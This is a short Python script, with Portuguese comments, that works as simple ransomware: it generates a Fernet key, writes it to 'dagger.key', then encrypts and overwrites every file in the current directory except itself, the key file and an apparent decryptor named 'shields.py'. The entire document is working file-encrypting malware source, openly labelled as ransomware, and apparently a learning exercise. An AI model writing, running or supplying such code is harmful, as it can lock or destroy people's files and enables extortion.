from importlib.resources import contents
import os
from cryptography.fernet import Fernet

files = []

# Chave de recuperação ramsomware
key = Fernet.generate_key()

with open("dagger.key", "wb") as dagger:
    dagger.write(key)

for file in os.listdir():
    if file == "knives.py" or file == "dagger.key" or file == "shields.py":  # não vai colocar na lista de files
        continue
    if os.path.isfile(file):
        files.append(file)

# Fazendo a cryptográfia
for file in files:
    with open(file, "rb") as archives:
        content = archives.read()
    content_encrypted = Fernet(key).encrypt(content)
    with open(file, "wb") as archive:
        archive.write(content_encrypted)
